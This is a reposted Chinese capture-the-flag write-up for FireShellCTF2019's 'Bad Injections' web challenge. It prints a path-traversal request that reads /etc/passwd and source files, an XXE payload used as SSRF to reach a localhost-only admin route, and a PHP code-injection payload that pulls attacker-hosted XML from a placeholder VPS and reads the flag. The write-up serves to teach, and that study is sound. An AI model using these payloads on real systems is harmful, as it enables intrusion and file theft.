> 原文链接: https://www.anquanke.com//post/id/170381 


# FireShellCTF2019 Bad Injections解题记录


                                阅读量   
                                **180952**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



![](https://p4.ssl.qhimg.com/t01aa9e9214544ee442.png)



题目地址：[http://68.183.31.62:94](http://68.183.31.62:94)

这是整场比赛最简单的Web题…Web题质量很高，貌似现在还没有关环境

主页面有四个功能，纯静态页面。右键about页面源码信息：

![](https://i.loli.net/2019/01/28/5c4e7566b0a62.png)

给个本地web目录

接着在list页面的源码里发现信息：

![](https://i.loli.net/2019/01/28/5c4e7581ec7bc.png)

因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功

```
68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc
```

这里让`hash = md5(file)`，成功下载到了/etc/passwd

![](https://i.loli.net/2019/01/28/5c4e75df5ff3d.png)

尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…

看到之前list下载的test.txt内容是这样的

![](https://i.loli.net/2019/01/28/5c4e75f994d2c.png)

down一下download的源码，顺便fuzz一下Controllers的文件

```
68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260
```

字典只跑出来了个admin.php

![](https://i.loli.net/2019/01/28/5c4e7631e6291.png)

先是用file_get_contents加载一个文本，之后loadXML解析取值，usort排序输出。感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag文件所以利用XXE没什么卵用，那应该就是代码注入了，但是要加载外部文本来引入正确xml文本才能进入函数判断。

尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。

```
68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8
```

/app/index.php

```
&lt;?php
ini_set('display_errors',1);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);
require_once('Routes.php');

function __autoload($class_name)`{`
  if(file_exists('./classes/'.$class_name.'.php'))`{`
    require_once './classes/'.$class_name.'.php';
  `}`else if(file_exists('./Controllers/'.$class_name.'.php'))`{`
    require_once './Controllers/'.$class_name.'.php';
  `}`

`}`

```

再去读路由/app/Routes.php

```
&lt;?php

Route::set('index.php',function()`{`
  Index::createView('Index');
`}`);

Route::set('index',function()`{`
  Index::createView('Index');
`}`);

Route::set('about-us',function()`{`
  AboutUs::createView('AboutUs');
`}`);

Route::set('contact-us',function()`{`
  ContactUs::createView('ContactUs');
`}`);

Route::set('list',function()`{`
  ContactUs::createView('Lista');
`}`);

Route::set('verify',function()`{`   
  if(!isset($_GET['file']) &amp;&amp; !isset($_GET['hash']))`{`
    Verify::createView('Verify');
  `}`else`{`
    Verify::verifyFile($_GET['file'],$_GET['hash']);  //设置session，file和hash对应请求文件
  `}`
`}`);


Route::set('download',function()`{`
  if(isset($_REQUEST['file']) &amp;&amp; isset($_REQUEST['hash']))`{`
    echo Download::downloadFile($_REQUEST['file'],$_REQUEST['hash']);
  `}`else`{`
    echo 'jdas';
  `}`
`}`);

Route::set('verify/download',function()`{`
  Verify::downloadFile($_REQUEST['file'],$_REQUEST['hash']);
`}`);


Route::set('custom',function()`{`
  $handler = fopen('php://input','r');
  $data = stream_get_contents($handler); // xml
  if(strlen($data) &gt; 1)`{`
    Custom::Test($data);
  `}`else`{`
    Custom::createView('Custom');
  `}`
`}`);

Route::set('admin',function()`{`
  if(!isset($_REQUEST['rss']) &amp;&amp; !isset($_REQUES['order']))`{`
    Admin::createView('Admin');
  `}`else`{`
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1')`{`
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    `}`else`{`
     echo ";(";
    `}`
  `}`
`}`);

Route::set('custom/sort',function()`{`
  Custom::sort($_REQUEST['rss'],$_REQUEST['order']);
`}`);
Route::set('index',function()`{`
 Index::createView('Index');
`}`);

```

原来我只down了download和admin页面，还有其它功能页面没down到，看到了玄学的admin规则如下，只有本地才能请求到sort函数

```
Route::set('admin',function()`{`
  if(!isset($_REQUEST['rss']) &amp;&amp; !isset($_REQUES['order']))`{`
    Admin::createView('Admin');
  `}`else`{`
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1')`{`
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    `}`else`{`
     echo ";(";
    `}`
  `}`
`}`);
```

只能找一下其他利用，再看Custom

```
Route::set('custom',function()`{`
  $handler = fopen('php://input','r');
  $data = stream_get_contents($handler); 
  if(strlen($data) &gt; 1)`{`
    Custom::Test($data);
  `}`else`{`
    Custom::createView('Custom');
  `}`
`}`);
```

Custom::Test

```
class Custom extends Controller`{`
  public static function Test($string)`{`
      $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
      $test = $root-&gt;name;
      echo $test;
  `}`
`}`
```

$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用

![](https://i.loli.net/2019/01/28/5c4e7655ea8f6.png)

联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板

poc:

```
&lt;?xml version='1.0'?&gt; 
&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM "http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1"&gt;]&gt;
&lt;note&gt;
&lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/note&gt;
```

![](https://i.loli.net/2019/01/28/5c4e7677a9567.png)

admin页面确实file_get_contents到了我vps的xxe文本。

尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行

`http://vps/xxe.txt`

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;root&gt;
&lt;channel&gt;
&lt;item&gt;
&lt;link&gt;@hpdoger.me&lt;/link&gt;
&lt;/item&gt;
&lt;item&gt;
&lt;link&gt;@souhu.com&lt;/link&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/root&gt;
```

`POC`

```
&lt;?xml version='1.0'?&gt; 
&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM "http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F"&gt;]&gt;
&lt;note&gt;
&lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/note&gt;
```

![](https://i.loli.net/2019/01/28/5c4e768d57f89.png)
